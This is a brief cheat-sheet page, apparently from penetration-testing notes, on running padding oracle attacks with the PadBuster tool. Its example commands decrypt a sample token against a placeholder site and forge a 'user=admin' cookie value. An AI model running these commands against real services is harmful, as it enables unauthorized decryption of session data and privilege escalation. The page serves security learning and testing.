---
title: Padding Oracle Attack
desc: 
tags: [AES, Cryptography, Oracle, PadBuster, Padding, XOR]
alts: []
render_with_liquid: false
---

## Using PadBuster

**[PadBuster](https://github.com/AonCyberLabs/PadBuster){:target="_blank"}{:rel="noopener"}** is automated script for performing Padding Oracle attacks. It’s useful to decrypt AES.

1. **Basic Usage**

    ```sh
    padbuster <url> <encrypted sample> <block size> [options]
    ```

2. **Examples**

    ```sh
    # Encrypted Sample -> 2hN2bBPw==
    # 16 -> Block site
    # -encoding: 0->Base64, 1->Lower Hex, 2->Upper Hex, 3->NET UrlToken, 4->WebSafe Base64
    padbuster https://vulnerable.com/?data=2hN2bBPw== 2hN2bBPw==  16 -encoding 0

    # -cookies: specify cookie value
    padbuster https://vulnerable.com/ 2hN2bBPw== 8 -encoding 0 -cookies "secret=2hN2bBPw=="

    # -plaintext: specify plain text
    padbuster https://vulnerable.com/ 2hN2bBPw== 8 -encoding 0 -cookies "secret=2hN2bBPw==" -plaintext "user=admin"
    ```
